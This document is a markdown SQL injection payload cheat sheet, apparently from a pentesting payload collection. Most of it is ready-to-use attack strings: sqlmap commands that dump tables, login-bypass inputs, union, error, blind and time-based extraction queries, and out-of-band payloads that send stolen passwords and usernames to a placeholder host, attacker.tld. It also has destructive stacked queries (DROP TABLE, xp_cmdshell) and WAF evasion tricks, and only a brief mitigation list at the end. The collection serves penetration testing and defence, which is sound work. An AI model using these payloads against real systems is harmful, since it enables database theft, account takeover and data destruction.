# SQL Injection

> SQL Injection (SQLi) occurs when user-supplied input is concatenated into an SQL query and executed by the database without proper validation or parameterization.

## Summary

- [Tools](#tools)
- [Exploit](#exploit)
- [Detection](#detection)
- [Authentication Bypass](#authentication-bypass)
- [Union-Based](#union-based)
- [Error-Based](#error-based)
- [Boolean-Based Blind](#boolean-based-blind)
- [Time-Based Blind](#time-based-blind)
- [Out-Of-Band (OOB)](#out-of-band-oob)
- [Stacked Queries](#stacked-queries)
- [Routed SQL Injection](#routed-sql-injection)
- [DBMS-Specific Payloads](#dbms-specific-payloads)
- [WAF Bypass](#waf-bypass)
- [Second-Order](#second-order)
- [References](#references)

## Tools

- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [jSQL Injection](https://github.com/ron190/jsql-injection)
- [BBQSQL](https://github.com/CiscoCXSecurity/bbqsql) — Blind SQLi exploitation
- [SQLNinja](http://sqlninja.sourceforge.net/)

## Exploit

```bash
# Basic detection with sqlmap
sqlmap -u "https://target.tld/page.php?id=1" --batch

# POST data
sqlmap -u "https://target.tld/login" --data "user=admin&pass=test" --batch

# Cookie-based
sqlmap -u "https://target.tld/" --cookie "session=abc; id=1*" --level 3 --risk 3

# Pull data
sqlmap -u "https://target.tld/page.php?id=1" --dbs
sqlmap -u "https://target.tld/page.php?id=1" -D mydb --tables
sqlmap -u "https://target.tld/page.php?id=1" -D mydb -T users --dump
```

## Detection

```sql
'
"
`
\
;--
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
 ORDER BY 1--
 ORDER BY 9999--
```

Trigger errors and observe responses:

```sql
'
\
%27
%5C
0x27
```

## Authentication Bypass

```sql
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
" or "1"="1
" or "1"="1"--
" or 1=1 or ""="
' or 'x'='x
admin" --
admin" #
admin"/*
```

### Hash-aware bypass

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '21232f297a57a5a743894a0e4a801fc3'--
```

(`21232f297a57a5a743894a0e4a801fc3` = MD5("admin"))

## Union-Based

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT user(),database(),version()-- -
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password FROM users-- -
```

### Find number of columns

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
...
' ORDER BY N-- -      -- increase until error
```

### Find string column

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

## Error-Based

### MySQL

```sql
' AND extractvalue(1, concat(0x7e, (SELECT database())))-- -
' AND updatexml(1, concat(0x7e,(SELECT version()),0x7e),1)-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### PostgreSQL

```sql
' AND CAST((SELECT version()) AS INT)-- -
' AND 1=CAST((SELECT current_user) AS INT)-- -
```

### MSSQL

```sql
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND 1=CONVERT(int,(SELECT db_name()))-- -
```

### Oracle

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
```

## Boolean-Based Blind

```sql
' AND 1=1-- -
' AND 1=2-- -
' AND SUBSTRING(version(),1,1)='5'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -
' AND (SELECT 'a' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='5')='a'-- -
```

## Time-Based Blind

### MySQL

```sql
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF((SELECT SUBSTRING(version(),1,1))='5',SLEEP(5),0)-- -
' OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
' AND BENCHMARK(10000000,MD5('A'))-- -
```

### PostgreSQL

```sql
' AND pg_sleep(5)-- -
'; SELECT pg_sleep(5)-- -
' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'-- -
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
```

### Oracle

```sql
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- -
' AND 1=(SELECT COUNT(*) FROM ALL_USERS t1, ALL_USERS t2, ALL_USERS t3, ALL_USERS t4)-- -
```

### SQLite

```sql
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -
```

## Out-Of-Band (OOB)

### MySQL (LOAD_FILE)

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.tld\\a'))-- -
```

### MSSQL (DNS exfil)

```sql
'; DECLARE @data varchar(1024); SELECT @data = (SELECT system_user); EXEC('master..xp_dirtree "\\'+@data+'.attacker.tld\\a"')-- -
```

### Oracle

```sql
' AND (SELECT UTL_HTTP.REQUEST('http://attacker.tld/'||user) FROM dual)-- -
' AND (SELECT DBMS_LDAP.INIT(((SELECT user FROM dual)||'.attacker.tld'),80) FROM dual) IS NOT NULL-- -
```

## Stacked Queries

```sql
'; DROP TABLE users-- -
'; INSERT INTO users(username,password) VALUES('attacker','x')-- -
'; EXEC xp_cmdshell('whoami')-- -          -- MSSQL
```

## Routed SQL Injection

When an inner query value is used by an outer one. Inject into the inner parameter to influence the outer.

```sql
0 UNION SELECT 'id=5 UNION SELECT username,password FROM users'-- -
```

## DBMS-Specific Payloads

### MySQL useful queries

```sql
SELECT @@version;
SELECT @@hostname;
SELECT @@datadir;
SELECT user();
SELECT database();
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database();
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';
```

### PostgreSQL useful queries

```sql
SELECT version();
SELECT current_database();
SELECT current_user;
SELECT string_agg(table_name, ',') FROM information_schema.tables;
SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users';
```

### MSSQL useful queries

```sql
SELECT @@version;
SELECT DB_NAME();
SELECT SYSTEM_USER;
SELECT name FROM master..sysdatabases;
SELECT name FROM sysobjects WHERE xtype='U';
```

### Oracle useful queries

```sql
SELECT banner FROM v$version;
SELECT user FROM dual;
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
```

## WAF Bypass

### Encoding

```
%27         '
%2527       URL-encoded twice
%c0%a7      Unicode bypass
+/*!50000UNION*/+  MySQL inline comment
/*!SELECT*/  MySQL versioned comment
```

### Case variation

```sql
UnIoN SeLeCt
uNiOn(SeLeCt 1,2,3)
```

### Whitespace alternatives

```
%09  tab
%0a  newline
%0c  form feed
%0d  carriage return
%a0  no-break space
/**/
/*!*/
+
()
```

### Concatenation tricks

```sql
SELECT/**/database()
SELECT(database())
SELECT`database`()
SELECT-database()-1
```

### Function bypasses

```sql
ascii(substring(database(),1,1))    -> ord(mid(database(),1,1))
                                    -> ascii(substr(database(),1,1))
                                    -> hex(left(database(),1))
```

## Second-Order

User input is stored and later used unsafely in a different context.

1. Register username: `admin'--`
2. Login as `admin'--`
3. Application later runs `UPDATE users SET password='x' WHERE username='admin'--'`

## Mitigation Cheat Sheet

- Use **parameterized queries / prepared statements** (PDO, JDBC, etc.).
- Apply **least-privilege** database accounts.
- Use **stored procedures** only when written with bind parameters.
- Validate input with **allow-lists**, not block-lists.
- Use an **ORM** with safe defaults — never string-concatenate user input.
- Deploy a **WAF** as a defense-in-depth layer, not as the primary control.

## References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PentestMonkey — SQLi Cheat Sheets](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
